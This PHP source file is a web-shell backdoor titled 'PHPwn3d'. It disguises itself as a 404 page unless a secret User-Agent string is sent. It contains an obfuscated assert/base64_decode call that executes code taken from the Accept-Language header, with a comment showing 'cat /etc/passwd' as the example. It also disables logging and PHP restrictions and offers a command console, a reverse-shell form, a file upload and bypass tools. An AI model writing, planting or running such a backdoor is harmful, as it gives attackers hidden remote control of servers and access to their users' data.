<!--session_start() to save few important states such as AUTH and SHOW_BUTTON-->
<?php session_start();?>
<!--setting comparison string for LOSER_AGENT, if invalid -> 404, if valid -> edit-->
<?php $regex_check = 'X-Gibson';?>
<?php $loser_agent = $_SERVER['HTTP_USER_AGENT']?>

<!--if not authenticated + no user agent -> 404 error page-->
<?php if(!(preg_match("/{$regex_check}/i", $loser_agent))):?>
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<?php echo "The requested URL " . $_SERVER['PHP_SELF'] ;echo"  ";echo "was not found on this server."; ?>
<hr>
<address><?php echo"" . $_SERVER['SERVER_SOFTWARE'];echo"  ";echo"Server at";echo "  " . $_SERVER['SERVER_ADDR'];echo " Port  " . $_SERVER['SERVER_PORT']; ?></address>
<style>
                input { margin:0;background-color:#fff;border:1px solid #fff; }
        </style>
        <center>
<!--if LOSER_AGENT is valid -> proceed to check the password-->
<?php else:?>
<?php
	$loser_agent = $_SERVER['HTTP_USER_AGENT'];
	if(isset($loser_agent)){
        $regex_check = 'X-Gibson';

	if(preg_match("/{$regex_check}/i", $loser_agent)) {
		$true = '1'; 
	}
	else {
		die(0);
	}

	//password authentication disabled for test, please re-enable
          if (/*$pass == "5up3r53kr1tp4zzw0rd123" &&*/ $true == '1' && ($_SESSION["auth"] == false)){
		$authenticated = true;
	}
	}
?>
<?php endif;?>

<?php if( ($_SESSION["auth"] == true) && ($_SESSION["display_button"] == false) ):?>
	<?php
	$safe_mode = @ini_get('safe_mode');
        $disable_functions = @ini_get('disable_functions');

	@ini_set('error_log',NULL);
	@ini_set('log_errors',0);
	@ini_set('max_execution_time',0);
	@ini_set('html_errors','0');
	@ini_set('display_errors','0');
	@ini_set('log_errors','0');
	@ini_restore("safe_mode");
	@ini_restore("open_basedir");
	@ini_restore("safe_mode_include_dir");
	@ini_restore("safe_mode_exec_dir");
	@ini_restore("disable_functions");
	@ini_restore("allow_url_fopen");
	@set_time_limit(0);
	if(phpversion() < 7) {
		@set_magic_quotes_runtime(0);
	}

	$IP;  // for later
	$dir = getcwd();
	$durr = realpath($_GET['chdir'])."/";
	$uname = php_uname();
	$version = explode('.', phpversion());
	$page = $_SERVER['SCRIPT_NAME'];
	$server = $_SERVER['SERVER_NAME'];
	$httpd = $_SERVER['SERVER_SOFTWARE'];
	$YourIP = $_SERVER['REMOTE_ADDR'];
	$b0x3n = $_SERVER['SERVER_ADDR'];

    /* will add some AJAX to load the new html content for the shell.. 
    seems like a much better option than using echo 
    to output src 1 line at a time, lol. */

	$verz = "Version 0.9";
	$title = "PHPwn3d ".$verz;
	echo "<title>".$title."</title>";

	$p3w = $_SERVER['HTTP_ACCEPT_LANGUAGE']; // to exec, set "Accept-Language: system("cat /etc/passwd");" in http headers
	$p3wp3w = base64_encode($p3w);
	$h0h0 = strrev;				 //PHP 7 TWEAK NOT TESTED UNDER PHP5
	$derp = 'tr'.'e'.'ssa';                  // this is executing in same manner as @extract(); shell (eg no POST/GET, and payload not in access_log)
	$herp = 'edoc'.'ed_'.'46'.'esab';        // therefore I've removed the @extract(); shell as it has the EXACT same use as the assert(); shell that
	$foo = $h0h0($derp);                     // I had already added to the src code. Still going to use mail(); w/ execve as one of the primary shells.
	$bar = $h0h0($herp);
	$foo($bar($p3wp3w));   // pew pew pew 

	clearstatcache();
	?>

<style type="text/css">
#gibson_console { align:left; border-style:double; border-color:#00cc00; width:900px; height:500px; padding:10px; background-color:#000; position: absolute; }
#gibson_title { color:#009933; text-align: center; }
#functionz { text-align: right; padding: 5%; }
@import url('https://fonts.googleapis.com/css2?family=Chilanka&display=swap');
h2 { text-align: center; font-family: 'Chilanka', cursive; font-style:oblique; font-weight: bold; color: #009933; }
body { background-image: url('https://wallpaperaccess.com/full/918659.jpg'); width: 100% ; height: 100%; font-family: 'Chilanka', cursive; font-style:oblique; font-weight: bold; color: #009933; } 
button { font-style:oblique; font-weight: bold;  color: #009933; }
#uploadz { text-align: right; position: relative; }
</style>
<script language="javascript" type="text/javascript">
        var ajax = new XMLHttpRequest();
        function fromserver() {
                if(ajax.readyState==4) {
                        con = document.getElementById("gibson_l33t");
                        con.innerHTML = ajax.responseText;
                        con.scrollTop = con.scrollHeight;
                        document.getElementById("gibson_command").value = "";
                }
        }
        function request() {
                ajax.onreadystatechange = fromserver;
                ajax.open("GET", "<?php echo $_SERVER['PHP_SELF']; ?>", true);
                ajax.setRequestHeader("X-Gibson", document.getElementById("gibson_command").value);
                ajax.send(null);
        }
</script>
<body>
<div id="gibson_container">
  <h2><b>PHPwn3d();</b>&nbsp; - A lightweight, stealthy, and flexible PHP backdoor</h2>
  <button type="button">SWITCH TO EDIT MODE</button>
  <div id="gibson_console">
  <h1 id="gibson_title">Console Interface:</h1><textarea id="gibson_l33t" style="width:100%;height:350px;"></textarea>
  </br>
  <span style="text-align:left;"><input id="gibson_command" type="text" style="width:850px;height:20px;" value=""><input id="gibson_exec" style="width:50px;" onClick="request()" type="button" value="exec">
  </span>
  </div>
  <div id="functionz">
  <button type="button"><a href="#">PHPINFO OUTPUT</a></button><br /><br />
  <button type="button">SYMLINK BYPASS</button><br /><br />
  <button type="button">HTACCESS OVERWRITE</button><br /><br />
  <button type="button"><a href="#">PHP.INI SETTINGS</a></button><br /><br />
  <br />
  <form action="#">
  <label for="IP">IP Address: </label><br>
  <input type="text" id="IP" name="IP" value="1.3.3.7"><br><label for="Port">Port:</label><br><input type="text" id="port" name="port" value="1337"><br>
  <input type="submit" value="Spawn Reverse Shell!">
</form> 
<br>
<div id="uploadz">
<form action="upload.php" method="post" enctype="multipart/form-data">
  <br>File Upload:<br>
  <input type="file" name="fileToUpload" id="fileToUpload"><br><input type="submit" value="UPLOAD" name="submit"><br>
</form>
</div>
</div>
</div>
</body>
<?php endif;?>

<!--As stated earlier, show the button on successful login, but only once-->
<?php if(($authenticated == true) && ($_SESSION["auth"] == false)):?>
	<?php $_SESSION["auth"] = true;?>
	<?php $_SESSION["display_button"] = false;?>
	<button onclick="window.location.reload();">Edit Mode</button>
<?php endif;?>
